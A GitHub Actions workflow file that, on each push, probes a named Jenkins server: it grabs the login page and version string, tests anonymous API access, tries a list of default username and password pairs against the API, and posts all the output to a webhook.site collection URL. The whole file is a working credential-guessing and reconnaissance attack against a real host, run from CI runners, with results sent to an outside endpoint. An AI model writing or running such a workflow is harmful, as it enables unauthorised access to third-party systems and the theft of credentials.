name: jprobe
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  jprobe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe
        run: |
          {
            echo "=== login page ==="
            curl -sS -k -m 15 -D - https://jenkins.htpl.cc/login -o /tmp/login.html 2>&1 | head -30
            grep -oE "Jenkins[^<]{0,40}|version[^<]{0,40}" /tmp/login.html 2>/dev/null | head -5
            echo "=== api anon ==="
            curl -sS -k -m 15 -o /tmp/api -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
            head -c 300 /tmp/api
            echo
            for c in admin:admin admin:password jenkins:jenkins root:root admin:jenkins admin:changeme; do
              echo "=== basic $c ==="
              curl -sS -k -m 15 -u "$c" -o /tmp/b -w "code=%{http_code} size=%{size_download}\n" https://jenkins.htpl.cc/api/json 2>&1
              head -c 200 /tmp/b; echo
            done
          } > /tmp/out.txt 2>&1
          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
